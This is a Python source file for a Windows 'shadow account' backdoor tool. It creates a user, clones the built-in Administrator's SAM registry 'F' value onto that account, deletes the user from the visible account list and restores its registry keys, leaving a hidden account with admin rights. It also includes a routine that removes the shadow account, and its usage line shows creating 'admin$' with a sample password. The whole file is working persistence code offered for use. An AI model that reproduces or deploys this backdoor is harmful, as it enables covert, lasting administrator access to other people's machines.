#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2020.02.10
# @Author  : Lhaihai
# @File    : account.py
# @Software: PyCharm
# @Blog    : http://www.Lhaihai.top
"""
    Description : 
"""

import pyregedit.pyregedit as pyregedit
from logger import factory_logger
logger = factory_logger('account')
import subprocess
from func import content_decode
import sys

def create_accout(username,password):
    command = 'net user {} {} /add'.format(username,password)
    r = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    rr = content_decode(r.stdout)
    logger.debug(rr)

def delete_accout(username):
    command = 'net user {} /delete'.format(username)
    r = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    rr = content_decode(r.stdout)
    logger.debug(rr)

def get_account_num(username):
    root = pyregedit.HKEY_LOCAL_MACHINE
    path = r"SAM\SAM\Domains\Account\Users\Names\\"+username
    reg = pyregedit.RegEdit(root,path)

    #判断键是否存在
    if reg.check_key():
        d = reg.get_value("")[1]
        return d
    else:
        #创建键
        # key = reg.create_key()
        pass

def get_admin_account_value():
    root = pyregedit.HKEY_LOCAL_MACHINE
    path = r"SAM\SAM\Domains\Account\Users\000001F4"
    reg = pyregedit.RegEdit(root,path)

    #判断键是否存在
    if reg.check_key():
        F = reg.get_value("F")[0]
        # V = reg.get_value("V")[0]
        return F
    else:
        return

def set_account(username,password):

    create_accout(username,password)

    #保存账号的类型
    account_type = get_account_num(username)

    root = pyregedit.HKEY_LOCAL_MACHINE
    path = r"SAM\SAM\Domains\Account\Users\\"+'00000'+str(hex(account_type))[2:]
    reg = pyregedit.RegEdit(root,path)

    #判断键是否存在
    if reg.check_key():
        admin_F = get_admin_account_value()
        V = reg.get_value("V")[0]
        # ForcePasswordReset = reg.get_value("ForcePasswordReset")[0]
        # SupplementalCredentials = reg.get_value("SupplementalCredentials")[0]
    else:
        logger.error("用户不存在")
        return

    delete_accout(username)

    #恢复注册表
    reg.create_value("F",pyregedit.REG_BINARY,admin_F)
    reg.create_value("V",pyregedit.REG_BINARY,V)
    # reg.create_value("ForcePasswordReset",pyregedit.REG_BINARY,ForcePasswordReset)
    # reg.create_value("SupplementalCredentials",pyregedit.REG_BINARY,SupplementalCredentials)

    path = r"SAM\SAM\Domains\Account\Users\Names\\" + username
    reg = pyregedit.RegEdit(root, path)
    reg.create_value("", account_type, "".encode())

    logger.info('影子账号创建成功')

def clear_account(username):
    account_type = get_account_num(username)
    if not account_type :
        logger.info("未植入影子后门")
        return

    root = pyregedit.HKEY_LOCAL_MACHINE
    path = r"SAM\SAM\Domains\Account\Users\Names\\" + username
    reg = pyregedit.RegEdit(root, path)
    try:
        reg.delete_current_key()
    except:
        pass

    path = r"SAM\SAM\Domains\Account\Users\\"+'00000'+str(hex(account_type))[2:]
    reg = pyregedit.RegEdit(root, path)
    try:
        reg.delete_current_key()
    except:
        pass

    logger.info("影子账号清除成功")


if __name__ == '__main__':
    action = sys.argv[1] if len(sys.argv) > 1 else ''
    if action == 'set' and len(sys.argv) == 4:
        set_account(sys.argv[2], sys.argv[3])
    elif action == 'clear' and len(sys.argv) == 3 :
        clear_account(sys.argv[2])
    else:
        print('account.exe set admin$ qwe123!@#')
        print('account.exe clear admin$')
